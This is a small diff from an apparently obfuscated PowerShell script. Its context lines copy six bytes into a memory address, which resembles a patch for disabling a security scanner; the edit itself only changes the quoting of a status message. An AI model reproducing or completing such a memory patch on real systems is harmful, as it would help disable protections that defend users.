@@ -27,5 +27,5 @@ $KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
 [System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
 
 
-$a = '`r`nDNBP Done`r`n'
+$a = "`r`nDNBP Done`r`n"
 $a
